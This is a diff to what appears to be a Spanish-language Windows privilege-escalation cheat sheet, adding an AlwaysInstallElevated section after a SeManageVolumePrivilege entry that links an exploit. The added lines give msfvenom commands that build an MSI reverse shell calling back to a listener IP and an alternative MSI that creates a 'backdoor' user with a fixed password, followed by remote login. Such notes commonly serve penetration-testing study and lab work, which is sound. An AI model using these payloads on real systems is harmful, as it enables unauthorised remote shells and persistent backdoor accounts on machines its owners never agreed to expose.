@@ -593,3 +593,9 @@ C:\Users\security\Desktop>
 ## SeManageVolumePrivilege
 - Este privilegio permite la habilidad de crear y eliminar volúmenes en el sistema.
 - Podemos utilizar [el siguiente exploit](https://github.com/CsEnox/SeManageVolumeExploit/tree/main) para elevar privilegios.
+
+## AlwaysInstallElevated
+- Este privilegio permite la habilidad de instalar software sin necesidad de permisos de administrador.
+- Armamos un payload `msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.210 LPORT=135 -f msi > payload.msi`
+    - Alternativa: `msfvenom -p cmd/windows/adduser USER=backdoor PASS=P@ssw0rd123 -f msi > payload.msi`
+    - Luego nos podemos conectar con winrm o usar runas
